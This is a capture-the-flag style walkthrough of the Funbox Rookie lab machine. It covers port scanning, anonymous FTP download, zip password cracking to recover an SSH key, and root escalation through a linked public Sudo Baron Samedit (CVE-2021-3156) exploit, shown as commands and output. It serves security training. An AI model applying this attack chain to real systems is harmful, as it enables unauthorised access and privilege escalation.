---
title: Funbox Rookie
categories: [Proving Grounds Play, Funbox]
tags: [FTP, Public Exploit, Unzip, PrivEsc]
image:
  path: https://miro.medium.com/v2/resize:fit:512/1*hN7YDho1p8S7uOdLjj-8Mw.png
  alt:  Funbox-Rookie Machine 🖥️
---


## **Description ⤵️**

>
💡 [Funbox : Rookie](https://www.vulnhub.com/entry/funbox-rookie,520/)
<br>
Boot2Root ! This can be a real life scenario if rockies becomes admins. Easy going in round about 15 mins. Bit more, if you are find and stuck in the rabbit-hole first.
<br>
This VM is created/tested with Virtualbox. Maybe it works with vmware.
<br>
If you need hints, call me on twitter: @0815R2d2
<br>
Have fun...
<br>
This works better with VirtualBox rather than VMware.
{: .prompt-info }


### Let’s find the IP Address first >>

```bash
IP : 192.168.225.107
```
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie]
└─$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 192.168.225.107
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-08 15:37 IST
Nmap scan report for 192.168.225.107
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/logs/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

---

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Funbox-Rookie/Untitled.png)

Lets check `robots.txt` file →

![Untitled](/Vulnhub-Files/img/Funbox-Rookie/Untitled%201.png)

## FTP Enumeration ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie]
└─$ ftp 192.168.225.107 21
Connected to 192.168.225.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.225.107]
Name (192.168.225.107:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.178 !
230-
230-The local time is: Sat Jul 08 10:10:10 2023
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||7526|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
ftp>
```
{: .nolineno}

Now I downloaded all the files into the attackers machine →

```bash
wget -r ftp://192.168.225.107
```
{: .nolineno}

Now lets dig into the files →

with the help of fcrackzip tool I cracked the zip passwords →

![Untitled](/Vulnhub-Files/img/Funbox-Rookie/Untitled%202.png)

```bash
PASSWORD FOUND!!!!: pw == iubire
```
{: .nolineno}

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie/192.168.225.107]
└─$ unzip tom.zip 
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa
```
{: .nolineno}

## SHELL ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie/192.168.225.107]
└─$ ssh tom@192.168.225.107 -i id_rsa 
The authenticity of host '192.168.225.107 (192.168.225.107)' cant be established.
ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.225.107' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  8 10:45:19 UTC 2023

  System load:  0.0               Processes:             164
  Usage of /:   75.8% of 4.37GB   Users logged in:       0
  Memory usage: 38%               IP address for ens256: 192.168.225.107
  Swap usage:   0%

30 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$
tom@funbox2:~$ cat local.txt
866bc12b3cc3f88f2bcfb8d091713b46
tom@funbox2:~$
```
{: .nolineno}

Now lets see the Sudo version →

```bash
tom@funbox2:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
tom@funbox2:~$
```
{: .nolineno}

Lets search an exploit for this Sudo version →

I got this exploit of [**CVE-2021-3156 (Sudo Baron Samedit)**](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py) and I used `exploit_nss.py` exploit **→**

```bash
tom@funbox2:/tmp$ nano exp.py
tom@funbox2:/tmp$ chmod +x exp.py
tom@funbox2:/tmp$ python3 exp.py
# whoami
root
# /bin/bash -i
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@funbox2:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(tom)
root@funbox2:/tmp# whoami
root
root@funbox2:/tmp# cd /root
root@funbox2:/root# ls -al
total 32
drwx------  4 root root 4096 Jul  9 09:51 .
drwxr-xr-x 24 root root 4096 Oct 14  2020 ..
-rw-------  1 root root    0 Oct 14  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Sep 15  2020 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 25  2020 .ssh
-rw-r--r--  1 root root   32 Oct 14  2020 flag.txt
-rw-------  1 root root   33 Jul  9 09:51 proof.txt
root@funbox2:/root# cat flag.txt 
Your flag is in another file...
root@funbox2:/root# cat proof.txt
7ca58542dc8a0d0181aaf812ae214c69
root@funbox2:/root#
```
{: .nolineno}

Now I am root !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }